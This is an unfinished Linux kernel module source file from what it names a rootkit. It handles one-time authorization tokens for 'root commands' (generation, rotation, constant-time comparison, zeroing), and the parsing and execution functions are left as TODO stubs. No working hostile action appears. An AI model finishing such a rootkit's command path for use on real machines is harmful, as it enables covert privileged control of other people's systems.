// SPDX-License-Identifier: GPL-2.0
#include <crypto/utils.h>
#include <linux/errno.h>
#include <linux/hex.h>
#include <linux/mutex.h>
#include <linux/random.h>
#include <linux/string.h>

#include "rootkit.h"

static DEFINE_MUTEX(authorization_lock);
static u8 active_token[RK_AUTHORIZATION_TOKEN_BYTES];
static unsigned long completed_actions;
static bool authorization_started;

static bool rk_tokens_equal(const u8 *left, const u8 *right)
{
	return crypto_memneq(left, right, RK_AUTHORIZATION_TOKEN_BYTES) == 0;
}

static __maybe_unused void
rk_rotate_token(const u8 previous[RK_AUTHORIZATION_TOKEN_BYTES])
{
	do {
		get_random_bytes(active_token, sizeof(active_token));
	} while (rk_tokens_equal(active_token, previous));
}

static __maybe_unused int rk_parse_root_command(
	const char *command, size_t length,
	u8 token[RK_AUTHORIZATION_TOKEN_BYTES])
{
	/* TODO: validate the exact grammar and decode its lowercase hex token. */
	return -EOPNOTSUPP;
}

int rk_authorization_start(void)
{
	/* TODO: wait for initialized randomness and create the first token. */
	return -EOPNOTSUPP;
}

void rk_authorization_stop(void)
{
	mutex_lock(&authorization_lock);
	memzero_explicit(active_token, sizeof(active_token));
	completed_actions = 0;
	authorization_started = false;
	mutex_unlock(&authorization_lock);
}

void rk_authorization_snapshot(const struct rk_state *state,
			       bool *actions_enabled,
			       unsigned long *completed,
			       char token[RK_AUTHORIZATION_TOKEN_TEXT_CAPACITY])
{
	mutex_lock(&authorization_lock);
	*actions_enabled = rk_state_actions_enabled(state);
	*completed = completed_actions;
	bin2hex(token, active_token, sizeof(active_token));
	token[RK_AUTHORIZATION_TOKEN_HEX_LENGTH] = '\0';
	mutex_unlock(&authorization_lock);
}

int rk_authorization_execute(struct rk_state *state, const char *command,
			     size_t length)
{
	u8 presented[RK_AUTHORIZATION_TOKEN_BYTES];

	/* TODO: parse, authorize, consume, act, rotate, and account atomically. */
	memzero_explicit(presented, sizeof(presented));
	return -EOPNOTSUPP;
}
